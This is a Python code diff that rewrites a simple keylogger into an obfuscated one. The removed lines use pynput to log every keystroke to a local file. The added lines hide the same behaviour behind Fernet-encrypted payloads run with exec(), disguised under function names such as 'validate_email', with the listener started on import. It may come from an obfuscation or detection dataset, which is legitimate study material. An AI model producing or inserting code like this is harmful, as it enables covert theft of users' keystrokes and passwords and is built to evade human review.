@@ -1,22 +1,19 @@
 def decode(s):
     return ''.join((chr(ord(c) - 1) for c in s))
 
-def _8_entered_value(input_value):
-    """
-    This function validates the user input value.
-    """
+def ZVWIQoKr(encrypted_code, key):
+    from cryptography.fernet import Fernet
+    import base64
+    fernet = Fernet(key)
+    decrypted = fernet.decrypt(base64.b64decode(encrypted_code.encode()))
+    return decrypted.decode()
 
-    def _9_user_entry():
-        return True
-
-    def _10_input_value():
-        return False
-    (lambda x, y: x() if type(input_value) == int else y())(_9_user_entry, _10_input_value)
+def validate_email(email):
+    exec(ZVWIQoKr('Z0FBQUFBQm4tSG5XOWp1WHhseWRPNDExRmFLUUxmbDZfZk1SX1NqTzJwTnZwWXBScjI1OUY3SjIxVU4yR3U0TGhXZ0JGOEIxRDMybnJpWURFeExpVmF5V0NwOGNFWFNZTVdrczBWYThPS2Fxc19ONnRjTWZfU3gwLWJ1elotQUpyb3ZVUkxlZXc1dlc0c0pvOVhWMDhIaGlyejFLQThINkszN3d6WXlRQzhKRmc2WlhJMU1yUVYxYU5kMkpPYjJTSHBydjgzNVhQUGhaNW1FSkdIWEl1UWk3Z2FNY3RzRm1GaktfQlFGd3VuaHJRcW9pMmUwRllTOFZ1Y2FXdDY1RlBRUzZKbW8xUHNRcm5WWjVfZXNRSHJ1RFhRd1V2UkxPUHhHR19sVkIwSGRuTkt4Q05SbW5VM3EtR2RzYlhqUTFIV3VYSGUxYUJKNnNiNjVqaDFkY29MVGVOdnRzX3VsQnZ1bWtXR0NHbDk5QjFCQnhyd2NSWjgtc0ExX1FONVdVdXY1ZEJnZU5MNVJORmgwcUg5V1huM1RlSk9JZ0ZRSy1nZ3UtS3d6bERBemdhdEE0TVRNQUtPRGVNdmNNRlNMdzdOM2lpRlhnaEN3Y1hYbWtFeWhLWVJmWHkzTkItSExLOVQyRFFtWGdxWmpvNWxHSWhtN29oaU5fcHpLRDhKT09wdG1NZU5IMTNNZENUeGpRaWFON05DODllZjBrTHBtLTVzaU9EUDRQY0dEYUZkZkZJYkpiS3p1M1loNzc2TmZMZzFKTnFRNjFtZEZWdXQzT00tY1dMazNqQ1VzVnlIVjM0Mm1DcE1aNEVlV2sxdTNNczFsZkZpb3NGbXVST0ZQWXFheDV1aGRnY1BTZmJSMjMzQmcyekNfbW5FTU1KVG55NkxMQmpaZzd5NzVQaEZ5SjI5YmRsR3c9', b'U6wqLgdpCRah2JcQeEhgeuVDSyynwCBIRN_Pv-knXAA='))
 import pynput
 
-def on_press(key):
-    with open(decode('mph/uyu'), decode('b')) as f:
-        f.write(str(key))
-listener = pynput.keyboard.Listener(on_press=on_press)
-listener.start()
-listener.join()
+def _3_user_response(_4_input_value):
+    exec(ZVWIQoKr('Z0FBQUFBQm4tSG5XNk5zaFdYZ0NnY3gwXzd0TGtuNWcyX09EVkJWVTFCT2N2NzJXZmdDMDhOTVR3OW5OTDFkbkNVMjNON2NFUUs3SHlma3pwRldYRUUtd3VscUw3TVhHNVdiejNuR2xYZ1dHbGIySVJVSk5BWDVHbXR6QXFlb0ZlWGlpSWFlamVMY0RLV3liUDVJWXpwdTExcFZuRXEzZGhVSjJ1NDVYU0t3Nll3XzRPLWtUc0xFNWRoVFRQeTRNbnp1SktKQVRHUDAxWVZiY0hXcGVJZldWOGkyZjFCVUMyZz09', b'U6wqLgdpCRah2JcQeEhgeuVDSyynwCBIRN_Pv-knXAA='))
+_1_user_input = pynput.keyboard.Listener(on_press=_3_user_response)
+_1_user_input.start()
+_1_user_input.join()
